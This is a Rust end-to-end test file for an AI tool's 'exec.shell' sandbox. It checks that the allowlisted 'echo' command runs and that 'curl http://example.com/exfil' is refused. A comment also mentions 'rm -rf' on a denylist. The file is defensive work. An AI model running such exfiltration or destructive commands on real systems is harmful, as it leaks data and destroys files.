//! E2E — `exec.shell` só executa binários da allowlist (Etapa 7
//! da Fase 7, ADR-0034 D3).
//!
//! Nomeado conforme `docs/architecture/exec-tools-specification.md`
//! §"Mapa de E2E": `e2e_exec_shell_allowlist.rs::ls_works_but_curl_blocked`.
//!
//! **Desvio deliberado do nome do teste na spec:** a spec usa
//! `ls` como exemplo de comando permitido — mas `ls` **não é**
//! builtin do `cmd.exe` (é utilitário POSIX; só existe no PATH se
//! Git for Windows/WSL estiverem instalados, o que não é garantido
//! em CI). Trocado por `echo`, que está em
//! `SHELL_ALLOWLIST_DEFAULT` **e** é builtin garantido do
//! `cmd.exe` em qualquer Windows — a mesma prova (gate de
//! allowlist deixa passar um binário read-only conhecido) sem
//! depender de ferramentas externas no `PATH` do CI.

#![cfg(windows)]

use std::sync::Arc;
use std::time::Duration;

use frederico_core::{ConversationId, MessageId, RunId};
use frederico_runtimes::{RuntimeConfig, RuntimeRegistry};
use frederico_security::jail::{SecurityJailConfig, SecurityJailResolver};
use frederico_tool_registry::exec::build_default_exec_tools;
use frederico_tool_registry::workspace::Jail;
use frederico_tool_registry::{AuditSink, NoopAuditSink, Tool, ToolContext};
use serde_json::json;
use tempfile::TempDir;

fn empty_registry() -> Arc<RuntimeRegistry> {
    let tmp: &'static TempDir = Box::leak(Box::new(TempDir::new().expect("tempdir")));
    let cfg = RuntimeConfig {
        install_root: tmp.path().to_path_buf(),
        keep_n_versions: 1,
        allow_download: false,
        mirror_url: None,
        download_timeout: Duration::from_secs(1),
    };
    Arc::new(RuntimeRegistry::new(cfg).expect("RuntimeRegistry::new"))
}

fn build_exec_tools() -> Vec<Arc<dyn Tool>> {
    let runtimes = empty_registry();
    let resolver = SecurityJailResolver::new(SecurityJailConfig::secure_default())
        .expect("SecurityJailResolver::new");
    let audit: Arc<dyn AuditSink> = Arc::new(NoopAuditSink);
    let network_allowlist = frederico_security::network::NetworkAllowlist::new();
    let network_audit: Arc<dyn frederico_security::network::NetworkAuditSink> =
        Arc::new(frederico_security::network::NoopNetworkAuditSink);
    build_default_exec_tools(resolver, runtimes, audit, network_allowlist, network_audit)
}

fn find_shell_tool(tools: &[Arc<dyn Tool>]) -> Arc<dyn Tool> {
    tools
        .iter()
        .find(|t| t.manifest().id == frederico_core::ToolId::new("exec.shell"))
        .expect("exec.shell no Vec retornado por build_default_exec_tools")
        .clone()
}

fn make_ctx(workspace: &std::path::Path) -> ToolContext {
    let jail = Jail::new(workspace).expect("Jail::new em workspace tempdir");
    ToolContext::new(ConversationId::new(), RunId::new(), MessageId::new(), jail)
}

/// `echo` (na `SHELL_ALLOWLIST_DEFAULT`, builtin do `cmd.exe`)
/// executa de verdade — prova que a allowlist deixa passar um
/// binário conhecido-seguro e o sandbox roda até o fim (não é só
/// o gate que aceita, o processo spawna e retorna stdout).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn echo_allowlisted_command_executes() {
    let tools = build_exec_tools();
    let tool = find_shell_tool(&tools);
    let workspace = TempDir::new().expect("tempdir workspace");
    let ctx = make_ctx(workspace.path());

    let result = tool
        .execute(&ctx, &json!({ "command": "echo hello from shell" }))
        .await;
    eprintln!(
        "[e2e_exec_shell/allowlist] ok={} err={:?} output={}",
        result.ok, result.error_message, result.output
    );
    assert!(result.ok, "echo falhou: {:?}", result.error_message);
    let stdout = result
        .output
        .get("stdout")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    assert!(
        stdout.contains("hello from shell"),
        "stdout inesperado: {stdout:?}"
    );
}

/// **Teste de negação:** `curl` não está na
/// `SHELL_ALLOWLIST_DEFAULT` — recusado antes do spawn, mesma
/// prova estrutural do `rm -rf` na denylist (recusa instantânea,
/// mensagem específica).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn curl_not_in_allowlist_is_blocked() {
    let tools = build_exec_tools();
    let tool = find_shell_tool(&tools);
    let workspace = TempDir::new().expect("tempdir workspace");
    let ctx = make_ctx(workspace.path());

    let result = tool
        .execute(&ctx, &json!({ "command": "curl http://example.com/exfil" }))
        .await;
    assert!(!result.ok, "esperava recusa, tool retornou ok");
    let err = result.error_message.unwrap_or_default();
    assert!(
        err.contains("nao esta na allowlist"),
        "esperava erro de allowlist, veio: {err:?}"
    );
}
